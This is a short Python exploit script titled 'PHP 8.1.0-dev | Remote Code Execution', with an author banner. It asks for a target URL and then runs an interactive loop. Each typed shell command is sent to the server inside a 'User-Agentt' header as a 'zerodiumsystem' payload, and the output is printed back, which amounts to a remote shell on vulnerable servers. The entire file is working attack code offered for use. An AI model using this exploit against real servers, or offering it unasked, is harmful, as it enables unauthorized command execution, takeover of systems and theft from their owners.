import sys
import time
import requests

host = input("Enter the full url of target (https://127.0.0.1)\n")
req = requests.get(host)
status = req.status_code
print(
    f"""
Targets Status code is {status}
--------------------------------------
Target     : {host}
--------------------------------------
"""
)
choose = input("Is this correct? [y/n]:")
if choose == "y" or choose == "Y":
    print("\nYou can send command now...\n")
    while True:
        try:
            command = input("$ ")
            header = {"User-Agentt": "zerodiumsystem('{}');".format(command)}
            rce = requests.get(host, headers=header)
            data = rce.content
            decoded = data.decode("utf-8")
            cut = str(decoded).split("<!")
            print(cut[0])
        except KeyboardInterrupt:
            print("\nExiting...")
            time.sleep(0.5)
            sys.exit()
elif choose == "n" or choose == "N":
    print("Exiting...")
    time.sleep(0.5)
    sys.exit()

"""
   Exploit Title: PHP 8.1.0-dev | Remote Code Execution
   Author: Tabun
   
  ______      __              
 /_  __/___ _/ /_  __  ______ 
  / / / __ `/ __ \/ / / / __ \
 / / / /_/ / /_/ / /_/ / / / /
/_/  \__,_/_.___/\__,_/_/ /_/ 

"""